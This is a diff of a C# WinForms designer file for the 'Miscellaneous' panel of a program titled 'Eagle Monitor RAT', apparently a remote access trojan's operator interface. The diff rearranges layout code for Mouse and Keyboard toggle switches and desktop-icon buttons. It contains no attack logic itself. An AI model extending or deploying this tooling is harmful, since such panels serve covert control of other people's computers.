@@ -29,6 +29,12 @@
         private void InitializeComponent()
         {
             System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(MiscellaneousForm));
+            this.label9 = new System.Windows.Forms.Label();
+            this.guna2GroupBox3 = new Guna.UI2.WinForms.Guna2GroupBox();
+            this.label7 = new System.Windows.Forms.Label();
+            this.keyboardGuna2ToggleSwitch = new Guna.UI2.WinForms.Guna2ToggleSwitch();
+            this.label6 = new System.Windows.Forms.Label();
+            this.mouseGuna2ToggleSwitch = new Guna.UI2.WinForms.Guna2ToggleSwitch();
             this.guna2GroupBox2 = new Guna.UI2.WinForms.Guna2GroupBox();
             this.hideDesktopIconsGuna2Button = new Guna.UI2.WinForms.Guna2Button();
             this.showDesktopIconsGuna2Button = new Guna.UI2.WinForms.Guna2Button();
@@ -48,16 +54,98 @@
             this.closeButton = new Guna.UI2.WinForms.Guna2Button();
             this.maximizeButton = new Guna.UI2.WinForms.Guna2Button();
             this.minimizeButton = new Guna.UI2.WinForms.Guna2Button();
-            this.guna2GroupBox3 = new Guna.UI2.WinForms.Guna2GroupBox();
-            this.label7 = new System.Windows.Forms.Label();
-            this.keyboardGuna2ToggleSwitch = new Guna.UI2.WinForms.Guna2ToggleSwitch();
-            this.label6 = new System.Windows.Forms.Label();
-            this.mouseGuna2ToggleSwitch = new Guna.UI2.WinForms.Guna2ToggleSwitch();
-            this.label9 = new System.Windows.Forms.Label();
+            this.guna2GroupBox3.SuspendLayout();
             this.guna2GroupBox2.SuspendLayout();
             this.guna2GroupBox1.SuspendLayout();
-            this.guna2GroupBox3.SuspendLayout();
             this.SuspendLayout();
+            // 
+            // label9
+            // 
+            this.label9.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left) 
+            | System.Windows.Forms.AnchorStyles.Right)));
+            this.label9.BackColor = System.Drawing.Color.Transparent;
+            this.label9.ForeColor = System.Drawing.Color.White;
+            this.label9.Location = new System.Drawing.Point(3, 0);
+            this.label9.Name = "label9";
+            this.label9.Size = new System.Drawing.Size(471, 32);
+            this.label9.TabIndex = 51;
+            this.label9.Text = "Eagle Monitor RAT";
+            this.label9.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
+            this.label9.MouseDown += new System.Windows.Forms.MouseEventHandler(this.label9_MouseDown);
+            // 
+            // guna2GroupBox3
+            // 
+            this.guna2GroupBox3.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(60)))), ((int)(((byte)(60)))), ((int)(((byte)(60)))));
+            this.guna2GroupBox3.Controls.Add(this.label7);
+            this.guna2GroupBox3.Controls.Add(this.keyboardGuna2ToggleSwitch);
+            this.guna2GroupBox3.Controls.Add(this.label6);
+            this.guna2GroupBox3.Controls.Add(this.mouseGuna2ToggleSwitch);
+            this.guna2GroupBox3.CustomBorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(60)))), ((int)(((byte)(60)))), ((int)(((byte)(60)))));
+            this.guna2GroupBox3.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(45)))), ((int)(((byte)(45)))), ((int)(((byte)(45)))));
+            this.guna2GroupBox3.Font = new System.Drawing.Font("Segoe UI", 9F);
+            this.guna2GroupBox3.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(230)))), ((int)(((byte)(230)))), ((int)(((byte)(230)))));
+            this.guna2GroupBox3.Location = new System.Drawing.Point(6, 144);
+            this.guna2GroupBox3.Name = "guna2GroupBox3";
+            this.guna2GroupBox3.ShadowDecoration.Parent = this.guna2GroupBox3;
+            this.guna2GroupBox3.Size = new System.Drawing.Size(269, 153);
+            this.guna2GroupBox3.TabIndex = 50;
+            this.guna2GroupBox3.Text = "Hardware";
+            // 
+            // label7
+            // 
+            this.label7.Location = new System.Drawing.Point(3, 87);
+            this.label7.Name = "label7";
+            this.label7.Size = new System.Drawing.Size(65, 38);
+            this.label7.TabIndex = 53;
+            this.label7.Text = "Keyboard :";
+            this.label7.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
+            // 
+            // keyboardGuna2ToggleSwitch
+            // 
+            this.keyboardGuna2ToggleSwitch.CheckedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(94)))), ((int)(((byte)(148)))), ((int)(((byte)(255)))));
+            this.keyboardGuna2ToggleSwitch.CheckedState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(94)))), ((int)(((byte)(148)))), ((int)(((byte)(255)))));
+            this.keyboardGuna2ToggleSwitch.CheckedState.InnerBorderColor = System.Drawing.Color.White;
+            this.keyboardGuna2ToggleSwitch.CheckedState.InnerColor = System.Drawing.Color.White;
+            this.keyboardGuna2ToggleSwitch.CheckedState.Parent = this.keyboardGuna2ToggleSwitch;
+            this.keyboardGuna2ToggleSwitch.Location = new System.Drawing.Point(86, 97);
+            this.keyboardGuna2ToggleSwitch.Name = "keyboardGuna2ToggleSwitch";
+            this.keyboardGuna2ToggleSwitch.ShadowDecoration.Parent = this.keyboardGuna2ToggleSwitch;
+            this.keyboardGuna2ToggleSwitch.Size = new System.Drawing.Size(47, 23);
+            this.keyboardGuna2ToggleSwitch.TabIndex = 54;
+            this.keyboardGuna2ToggleSwitch.UncheckedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(125)))), ((int)(((byte)(137)))), ((int)(((byte)(149)))));
+            this.keyboardGuna2ToggleSwitch.UncheckedState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(125)))), ((int)(((byte)(137)))), ((int)(((byte)(149)))));
+            this.keyboardGuna2ToggleSwitch.UncheckedState.InnerBorderColor = System.Drawing.Color.White;
+            this.keyboardGuna2ToggleSwitch.UncheckedState.InnerColor = System.Drawing.Color.White;
+            this.keyboardGuna2ToggleSwitch.UncheckedState.Parent = this.keyboardGuna2ToggleSwitch;
+            this.keyboardGuna2ToggleSwitch.CheckedChanged += new System.EventHandler(this.keyboardGuna2ToggleSwitch_CheckedChanged);
+            // 
+            // label6
+            // 
+            this.label6.Location = new System.Drawing.Point(3, 44);
+            this.label6.Name = "label6";
+            this.label6.Size = new System.Drawing.Size(65, 38);
+            this.label6.TabIndex = 50;
+            this.label6.Text = "Mouse :";
+            this.label6.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
+            // 
+            // mouseGuna2ToggleSwitch
+            // 
+            this.mouseGuna2ToggleSwitch.CheckedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(94)))), ((int)(((byte)(148)))), ((int)(((byte)(255)))));
+            this.mouseGuna2ToggleSwitch.CheckedState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(94)))), ((int)(((byte)(148)))), ((int)(((byte)(255)))));
+            this.mouseGuna2ToggleSwitch.CheckedState.InnerBorderColor = System.Drawing.Color.White;
+            this.mouseGuna2ToggleSwitch.CheckedState.InnerColor = System.Drawing.Color.White;
+            this.mouseGuna2ToggleSwitch.CheckedState.Parent = this.mouseGuna2ToggleSwitch;
+            this.mouseGuna2ToggleSwitch.Location = new System.Drawing.Point(86, 55);
+            this.mouseGuna2ToggleSwitch.Name = "mouseGuna2ToggleSwitch";
+            this.mouseGuna2ToggleSwitch.ShadowDecoration.Parent = this.mouseGuna2ToggleSwitch;
+            this.mouseGuna2ToggleSwitch.Size = new System.Drawing.Size(47, 23);
+            this.mouseGuna2ToggleSwitch.TabIndex = 52;
+            this.mouseGuna2ToggleSwitch.UncheckedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(125)))), ((int)(((byte)(137)))), ((int)(((byte)(149)))));
+            this.mouseGuna2ToggleSwitch.UncheckedState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(125)))), ((int)(((byte)(137)))), ((int)(((byte)(149)))));
+            this.mouseGuna2ToggleSwitch.UncheckedState.InnerBorderColor = System.Drawing.Color.White;
+            this.mouseGuna2ToggleSwitch.UncheckedState.InnerColor = System.Drawing.Color.White;
+            this.mouseGuna2ToggleSwitch.UncheckedState.Parent = this.mouseGuna2ToggleSwitch;
+            this.mouseGuna2ToggleSwitch.CheckedChanged += new System.EventHandler(this.mouseGuna2ToggleSwitch_CheckedChanged);
             // 
             // guna2GroupBox2
             // 
@@ -355,91 +443,6 @@
             this.minimizeButton.Text = "🗕";
             this.minimizeButton.Click += new System.EventHandler(this.minimizeButton_Click);
             // 
-            // guna2GroupBox3
-            // 
-            this.guna2GroupBox3.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(60)))), ((int)(((byte)(60)))), ((int)(((byte)(60)))));
-            this.guna2GroupBox3.Controls.Add(this.label7);
-            this.guna2GroupBox3.Controls.Add(this.keyboardGuna2ToggleSwitch);
-            this.guna2GroupBox3.Controls.Add(this.label6);
-            this.guna2GroupBox3.Controls.Add(this.mouseGuna2ToggleSwitch);
-            this.guna2GroupBox3.CustomBorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(60)))), ((int)(((byte)(60)))), ((int)(((byte)(60)))));
-            this.guna2GroupBox3.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(45)))), ((int)(((byte)(45)))), ((int)(((byte)(45)))));
-            this.guna2GroupBox3.Font = new System.Drawing.Font("Segoe UI", 9F);
-            this.guna2GroupBox3.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(230)))), ((int)(((byte)(230)))), ((int)(((byte)(230)))));
-            this.guna2GroupBox3.Location = new System.Drawing.Point(6, 144);
-            this.guna2GroupBox3.Name = "guna2GroupBox3";
-            this.guna2GroupBox3.ShadowDecoration.Parent = this.guna2GroupBox3;
-            this.guna2GroupBox3.Size = new System.Drawing.Size(269, 153);
-            this.guna2GroupBox3.TabIndex = 50;
-            this.guna2GroupBox3.Text = "Hardware";
-            // 
-            // label7
-            // 
-            this.label7.Location = new System.Drawing.Point(3, 87);
-            this.label7.Name = "label7";
-            this.label7.Size = new System.Drawing.Size(65, 38);
-            this.label7.TabIndex = 53;
-            this.label7.Text = "Keyboard :";
-            this.label7.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
-            // 
-            // keyboardGuna2ToggleSwitch
-            // 
-            this.keyboardGuna2ToggleSwitch.CheckedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(94)))), ((int)(((byte)(148)))), ((int)(((byte)(255)))));
-            this.keyboardGuna2ToggleSwitch.CheckedState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(94)))), ((int)(((byte)(148)))), ((int)(((byte)(255)))));
-            this.keyboardGuna2ToggleSwitch.CheckedState.InnerBorderColor = System.Drawing.Color.White;
-            this.keyboardGuna2ToggleSwitch.CheckedState.InnerColor = System.Drawing.Color.White;
-            this.keyboardGuna2ToggleSwitch.CheckedState.Parent = this.keyboardGuna2ToggleSwitch;
-            this.keyboardGuna2ToggleSwitch.Location = new System.Drawing.Point(86, 97);
-            this.keyboardGuna2ToggleSwitch.Name = "keyboardGuna2ToggleSwitch";
-            this.keyboardGuna2ToggleSwitch.ShadowDecoration.Parent = this.keyboardGuna2ToggleSwitch;
-            this.keyboardGuna2ToggleSwitch.Size = new System.Drawing.Size(47, 23);
-            this.keyboardGuna2ToggleSwitch.TabIndex = 54;
-            this.keyboardGuna2ToggleSwitch.UncheckedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(125)))), ((int)(((byte)(137)))), ((int)(((byte)(149)))));
-            this.keyboardGuna2ToggleSwitch.UncheckedState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(125)))), ((int)(((byte)(137)))), ((int)(((byte)(149)))));
-            this.keyboardGuna2ToggleSwitch.UncheckedState.InnerBorderColor = System.Drawing.Color.White;
-            this.keyboardGuna2ToggleSwitch.UncheckedState.InnerColor = System.Drawing.Color.White;
-            this.keyboardGuna2ToggleSwitch.UncheckedState.Parent = this.keyboardGuna2ToggleSwitch;
-            this.keyboardGuna2ToggleSwitch.CheckedChanged += new System.EventHandler(this.keyboardGuna2ToggleSwitch_CheckedChanged);
-            // 
-            // label6
-            // 
-            this.label6.Location = new System.Drawing.Point(3, 44);
-            this.label6.Name = "label6";
-            this.label6.Size = new System.Drawing.Size(65, 38);
-            this.label6.TabIndex = 50;
-            this.label6.Text = "Mouse :";
-            this.label6.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
-            // 
-            // mouseGuna2ToggleSwitch
-            // 
-            this.mouseGuna2ToggleSwitch.CheckedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(94)))), ((int)(((byte)(148)))), ((int)(((byte)(255)))));
-            this.mouseGuna2ToggleSwitch.CheckedState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(94)))), ((int)(((byte)(148)))), ((int)(((byte)(255)))));
-            this.mouseGuna2ToggleSwitch.CheckedState.InnerBorderColor = System.Drawing.Color.White;
-            this.mouseGuna2ToggleSwitch.CheckedState.InnerColor = System.Drawing.Color.White;
-            this.mouseGuna2ToggleSwitch.CheckedState.Parent = this.mouseGuna2ToggleSwitch;
-            this.mouseGuna2ToggleSwitch.Location = new System.Drawing.Point(86, 55);
-            this.mouseGuna2ToggleSwitch.Name = "mouseGuna2ToggleSwitch";
-            this.mouseGuna2ToggleSwitch.ShadowDecoration.Parent = this.mouseGuna2ToggleSwitch;
-            this.mouseGuna2ToggleSwitch.Size = new System.Drawing.Size(47, 23);
-            this.mouseGuna2ToggleSwitch.TabIndex = 52;
-            this.mouseGuna2ToggleSwitch.UncheckedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(125)))), ((int)(((byte)(137)))), ((int)(((byte)(149)))));
-            this.mouseGuna2ToggleSwitch.UncheckedState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(125)))), ((int)(((byte)(137)))), ((int)(((byte)(149)))));
-            this.mouseGuna2ToggleSwitch.UncheckedState.InnerBorderColor = System.Drawing.Color.White;
-            this.mouseGuna2ToggleSwitch.UncheckedState.InnerColor = System.Drawing.Color.White;
-            this.mouseGuna2ToggleSwitch.UncheckedState.Parent = this.mouseGuna2ToggleSwitch;
-            this.mouseGuna2ToggleSwitch.CheckedChanged += new System.EventHandler(this.mouseGuna2ToggleSwitch_CheckedChanged);
-            // 
-            // label9
-            // 
-            this.label9.BackColor = System.Drawing.Color.Transparent;
-            this.label9.ForeColor = System.Drawing.Color.White;
-            this.label9.Location = new System.Drawing.Point(3, 0);
-            this.label9.Name = "label9";
-            this.label9.Size = new System.Drawing.Size(235, 32);
-            this.label9.TabIndex = 51;
-            this.label9.Text = "Eagle Monitor RAT";
-            this.label9.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
-            // 
             // MiscellaneousForm
             // 
             this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
@@ -459,10 +462,10 @@
             this.Name = "MiscellaneousForm";
             this.Padding = new System.Windows.Forms.Padding(3, 32, 3, 3);
             this.Text = "MiscellaneousForm";
+            this.guna2GroupBox3.ResumeLayout(false);
             this.guna2GroupBox2.ResumeLayout(false);
             this.guna2GroupBox1.ResumeLayout(false);
             this.guna2GroupBox1.PerformLayout();
-            this.guna2GroupBox3.ResumeLayout(false);
             this.ResumeLayout(false);
 
         }
